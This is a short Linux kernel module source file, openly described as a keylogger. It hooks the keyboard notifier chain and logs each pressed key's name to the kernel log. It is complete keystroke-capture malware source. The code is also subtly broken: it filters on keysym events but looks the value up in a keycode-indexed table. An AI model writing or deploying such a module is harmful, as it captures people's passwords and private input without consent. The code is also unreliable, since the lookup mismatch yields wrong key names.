#include <linux/init.h>
#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/input-event-codes.h>

MODULE_AUTHOR("Nicholas Hubbard");
MODULE_DESCRIPTION("A keylogger");
MODULE_LICENSE("GPL");

static const char *keycode_names[KEY_MAX + 1] = {
    [KEY_A] = "A",
    [KEY_B] = "B",
    [KEY_C] = "C",
    [KEY_D] = "D",
    [KEY_E] = "E",
    [KEY_F] = "F",
    [KEY_G] = "G",
    [KEY_H] = "H",
    [KEY_I] = "I",
    [KEY_J] = "J",
    [KEY_K] = "K",
    [KEY_L] = "L",
    [KEY_M] = "M",
    [KEY_N] = "N",
    [KEY_O] = "O",
    [KEY_P] = "P",
    [KEY_Q] = "Q",
    [KEY_R] = "R",
    [KEY_S] = "S",
    [KEY_T] = "T",
    [KEY_U] = "U",
    [KEY_V] = "V",
    [KEY_W] = "W",
    [KEY_X] = "X",
    [KEY_Y] = "Y",
    [KEY_Z] = "Z",
    [KEY_1] = "1",
    [KEY_2] = "2",
    [KEY_3] = "3",
    [KEY_4] = "4",
    [KEY_5] = "5",
    [KEY_6] = "6",
    [KEY_7] = "7",
    [KEY_8] = "8",
    [KEY_9] = "9",
    [KEY_0] = "0",
    [KEY_ENTER] = "ENTER",
    [KEY_SPACE] = "SPACE",
    [KEY_BACKSPACE] = "BACKSPACE",
    [KEY_TAB] = "TAB",
    [KEY_ESC] = "ESC",
    [KEY_LEFTSHIFT] = "LSHIFT",
    [KEY_RIGHTSHIFT] = "RSHIFT",
    [KEY_LEFTCTRL] = "LCTRL",
    [KEY_RIGHTCTRL] = "RCTRL",
    [KEY_LEFTALT] = "LALT",
    [KEY_RIGHTALT] = "RALT",
    [KEY_CAPSLOCK] = "CAPSLOCK",
    // Add more keys as needed
};

static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
  struct keyboard_notifier_param *param = data;

  if (action == KBD_KEYSYM && param->down) {
    if (param->value <= KEY_MAX && keycode_names[param->value])
      printk(KERN_INFO "kloggg: key = %s\n", keycode_names[param->value]);
    else
      printk(KERN_INFO "kloggg: unknown keycode = %u\n", param->value);

  }
  
  return NOTIFY_OK;
}

static struct notifier_block kloggg_nb = {
  .notifier_call = kloggg_log
};

/* Module initialization */
static int __init kloggg_init(void) {
  register_keyboard_notifier(&kloggg_nb);
  return 0;
}

/* Module cleanup */
static void __exit kloggg_exit(void) {
  unregister_keyboard_notifier(&kloggg_nb);
}

module_init(kloggg_init);
module_exit(kloggg_exit);
